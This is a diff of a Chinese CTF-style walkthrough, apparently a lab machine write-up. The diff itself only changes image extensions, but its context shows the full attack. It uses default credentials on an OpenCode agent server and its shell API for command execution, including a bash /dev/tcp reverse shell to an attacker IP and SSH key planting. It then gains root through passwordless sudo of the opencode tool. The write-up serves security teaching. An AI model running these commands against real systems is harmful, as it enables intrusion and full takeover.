@@ -11,7 +11,7 @@
 | 开放端口 | 22/tcp、80/tcp、4096/tcp |
 | 最终路径 | 页面注释线索 → OpenCode Basic Auth → Session Shell API → SSH → sudo opencode serve → root |
 
-![Nmap 全端口扫描结果](/content/code/image-01.png)
+![Nmap 全端口扫描结果](/content/code/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -47,11 +47,11 @@ nmap -sT -sV -sC -O -p- 192.168.134.65
 <!--https://opencode.ai/docs/zh-cn/web/-->
 ```
 
-![页面源码中的 OpenCode 文档注释](/content/code/image-02.png)
+![页面源码中的 OpenCode 文档注释](/content/code/image-02.webp)
 
 这说明 4096 上的服务大概率就是 OpenCode Web。访问 `http://192.168.134.65:4096` 会弹出 Basic Auth。
 
-![4096 端口要求 Basic Auth 登录](/content/code/image-03.png)
+![4096 端口要求 Basic Auth 登录](/content/code/image-03.webp)
 
 结合文档线索做授权口令验证后，得到：
 
@@ -61,7 +61,7 @@ opencode / secret
 
 登录成功，确认是 OpenCode 控制台。
 
-![使用 opencode:secret 进入 OpenCode](/content/code/image-04.png)
+![使用 opencode:secret 进入 OpenCode](/content/code/image-04.webp)
 
 ## 3. 利用：OpenCode Session Shell API
 
@@ -86,7 +86,7 @@ curl -s -X POST http://192.168.134.65:4096/session/<SESSION_ID>/shell \
 
 返回显示当前身份为 `uid=1000(beehack)`。OpenCode 本身就是设计来执行 shell 的，因此这里等价于已认证 RCE。
 
-![OpenCode API 命令执行思路](/content/code/image-05.png)
+![OpenCode API 命令执行思路](/content/code/image-05.webp)
 
 先弹一个交互 Shell：
 
@@ -100,7 +100,7 @@ curl -s -X POST http://192.168.134.65:4096/session/<SESSION_ID>/shell \
   -d '{"command":"bash -i >& /dev/tcp/192.168.134.4/4444 0>&1","agent":"build"}'
 ```
 
-![通过 Shell API 触发反弹 Shell](/content/code/image-06.png)
+![通过 Shell API 触发反弹 Shell](/content/code/image-06.webp)
 
 在会话里读取 user flag，并把攻击机公钥写入 `~/.ssh/authorized_keys`，再用 SSH 拿稳定终端：
 
@@ -122,7 +122,7 @@ sudo -l
 (ALL : ALL) NOPASSWD: /usr/local/bin/opencode
 ```
 
-![写入公钥、SSH 登录并发现 sudo opencode](/content/code/image-07.png)
+![写入公钥、SSH 登录并发现 sudo opencode](/content/code/image-07.webp)
 
 ## 4. 提权：sudo OpenCode 再开一个 root 服务
 
@@ -134,7 +134,7 @@ sudo /usr/local/bin/opencode serve --port 4097 --hostname 127.0.0.1
 
 服务提示 `OPENCODE_SERVER_PASSWORD is not set; server is unsecured`，并监听 `http://127.0.0.1:4097`。
 
-![sudo 启动未设密码的 root OpenCode 服务](/content/code/image-08.png)
+![sudo 启动未设密码的 root OpenCode 服务](/content/code/image-08.webp)
 
 若前台会占住终端，可放后台：
 
@@ -164,9 +164,9 @@ uid=0(root) gid=0(root) groups=0(root)
 root
 ```
 
-![通过本机 root OpenCode API 执行 id](/content/code/image-09.png)
+![通过本机 root OpenCode API 执行 id](/content/code/image-09.webp)
 
-![确认 root 权限与最终结果](/content/code/image-10.png)
+![确认 root 权限与最终结果](/content/code/image-10.webp)
 
 > 防守视角：给 AI/Agent 类工具免密 sudo，本质上就是给了 root 命令执行。即使绑在本机回环，低权限用户仍可复用同一套 API。
 
